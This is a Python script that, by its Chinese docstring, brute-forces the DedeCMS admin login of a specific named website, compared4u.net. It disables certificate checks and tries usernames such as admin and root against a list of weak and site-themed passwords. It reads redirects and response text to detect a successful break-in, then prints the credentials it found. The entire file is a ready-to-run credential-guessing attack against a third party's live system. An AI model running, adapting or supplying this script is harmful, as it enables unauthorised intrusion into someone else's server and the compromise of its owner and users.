#!/usr/bin/env python3
"""bf_dede_compare.py - compared4u.net DedeCMS无验证码爆破"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'https://www.compared4u.net'
LOGIN = BASE + '/dede/login.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "dedecms", "compared4u", "compare123", "123456789",
             "1qaz2wsx", "qwe123", "admin!@#", "adminadmin", "compare4u",
             "c4u123", "root", "test123"]

def main():
    for user in ['admin', 'root', 'dedecms']:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        # 拿登录页cookie+确认表单
        try:
            r = opener.open(urllib.request.Request(LOGIN, headers=UA), timeout=10)
            b0 = r.read(20000).decode('utf-8', 'ignore')
            if 'userPass' not in b0:
                print('%s: unexpected login page' % user, flush=True)
                continue
        except Exception as e:
            print('%s: login page err %s' % (user, repr(e)[:80]), flush=True)
            continue

        for pw in PASSWORDS:
            # DedeCMS dopost=login 或自定义
            data = urllib.parse.urlencode({
                'userName': user, 'userPass': pw, 'q': '',
                'dopost': 'login', 'gotopage': '/dede/index.php'
            }).encode()
            try:
                req = urllib.request.Request(LOGIN, data=data,
                                             headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                                      'Referer': LOGIN})
                resp = opener.open(req, timeout=10)
                b = resp.read(15000).decode('utf-8', 'ignore')
                fu = resp.geturl()
                st = resp.status
            except urllib.error.HTTPError as e:
                st, b, fu = e.code, e.read(15000).decode('utf-8', 'ignore'), e.geturl()
            except Exception:
                continue
            # 判定
            if st == 302 and 'login' not in fu.lower():
                print('!!! HIT: %s/%s -> %s' % (user, pw, fu), flush=True)
                sys.exit(0)
            if 'index' in fu.lower() and 'login' not in fu.lower():
                print('!!! HIT: %s/%s -> %s' % (user, pw, fu), flush=True)
                sys.exit(0)
            if '错误' in b or '失败' in b or '不正确' in b or 'invalid' in b.lower():
                if pw == PASSWORDS[0]:
                    print('  %s: sample err resp (%d bytes)' % (user, len(b)), flush=True)
                time.sleep(0.3)
                continue
            if len(b) > 1000 and 'userPass' not in b:
                print('!!! CHECK %s/%s st=%d fu=%s' % (user, pw, st, fu), flush=True)
                print('  body: %s' % b[:200].replace(chr(10), ' '), flush=True)
                sys.exit(0)
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
